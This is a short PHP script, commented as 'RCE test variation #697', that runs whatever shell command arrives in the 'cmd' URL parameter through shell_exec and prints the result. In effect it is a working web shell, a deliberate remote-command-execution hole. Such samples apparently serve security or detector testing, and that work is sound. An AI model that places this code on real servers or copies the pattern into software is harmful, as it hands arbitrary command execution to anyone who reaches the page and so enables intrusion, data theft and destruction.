<?php
// RCE test variation #697
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>